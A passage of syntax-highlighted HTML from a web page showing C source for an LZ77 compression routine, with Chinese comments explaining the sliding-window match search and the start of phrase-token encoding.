id=\"crayon-5b4d7bc4732a6740937600-11\"><span class=\"crayon-h\">                       </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-12\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">match</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">longest</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-14\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*初始化偏移量*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-16\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-17\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*如果没有找到匹配，准备在前向缓冲区中返回0和下一个字符*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">longest</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">next</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-21\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*在前向缓冲区和滑动窗口中寻找最佳匹配*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">k</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">match</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-28\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-29\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*确定滑动窗口中k个偏移量匹配的符号数*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-30\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-31\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-32\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-33\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-34\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-35\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">match</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-36\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-37\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-38\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-39\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-40\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*跟踪最佳匹配的偏移、长度和下一个符号*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-41\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">match</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">longest</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-42\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-43\"><span class=\"crayon-h\">            </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-44\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">longest</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">match</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-45\"><span class=\"crayon-h\">            </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">next</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-46\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-47\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-48\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">longest</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-49\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-50\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-51\"><span class=\"crayon-c\">/*lz77_compress  使用lz77算法压缩数据*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-52\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lz77_compress</span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">original</span><span class=\"crayon-sy\">,</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-53\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-54\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\">     </span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-55\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-56\"><span class=\"crayon-h\">                      </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">comp</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-57\"><span class=\"crayon-h\">                      </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-58\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-59\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\">               </span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-60\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-61\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-62\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">hsize</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-63\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-64\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">opos</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-65\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-66\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-67\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*使指向压缩数据的指针暂时无效*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-68\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-69\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-70\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*写入头部信息*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-71\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">hsize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-72\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">comp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-e\">malloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">hsize</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-73\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-74\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">memcpy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">comp</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-75\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-76\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*初始化滑动窗口和前向缓冲区(用0填充)*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-77\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">memset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-78\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">memset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-79\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-80\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*加载前向缓冲区*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-81\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-82\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-83\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-84\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-85\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">original</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-86\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-87\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-88\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-89\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*压缩数据*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-90\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">opos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">hsize *</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-91\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-92\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-93\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-94\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-95\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">compare_win</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-96\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-97\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*编码短语标记*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-98\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x00000001</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">LZ77_PHRASE_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-99\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-100\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*设置在滑动窗口找到匹配的偏移量*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-101\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">LZ77_PHRASE_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_TYPE_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_WINOFF_BITS</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-102\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-103\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*设置匹配串的长度*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-104\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">LZ77_PHRASE_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_TYPE_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_WINOFF_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_BUFLEN_BITS</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-105\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-106\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*设置前向缓冲区中匹配串后面紧邻的字符*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-107\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-108\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-109\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*设置标记的位数*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-110\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">tbits</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_PHRASE_BITS</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-111\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-112\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">else</span></div><div class=\"crayon-line\" 